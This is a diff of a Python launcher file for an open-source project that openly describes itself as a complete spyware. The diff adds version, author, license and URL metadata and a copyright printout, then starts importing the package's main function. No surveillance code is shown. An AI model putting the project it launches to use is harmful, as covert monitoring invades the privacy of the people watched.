@@ -1,12 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-"""
-This package implements a spyware.
-"""
-
 ###################
-#    This package implements a spyware.
+#    This file implements a complete spyware.
 #    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
@@ -23,14 +19,31 @@ This package implements a spyware.
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-print(
-    """
+"""
+This file implements a complete spyware.
+"""
+
+__version__ = "1.0.1"
+__author__ = "Maurice Lambert"
+__author_email__ = "mauricelambert434@gmail.com"
+__maintainer__ = "Maurice Lambert"
+__maintainer_email__ = "mauricelambert434@gmail.com"
+__description__ = """
+This file implements a complete spyware.
+"""
+license = "GPL-3.0 License"
+__url__ = "https://github.com/mauricelambert/SpyWare"
+
+copyright = """
 SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
 """
-)
+__license__ = license
+__copyright__ = copyright
+
+print(copyright)
 
 try:
     from SpyWare import main
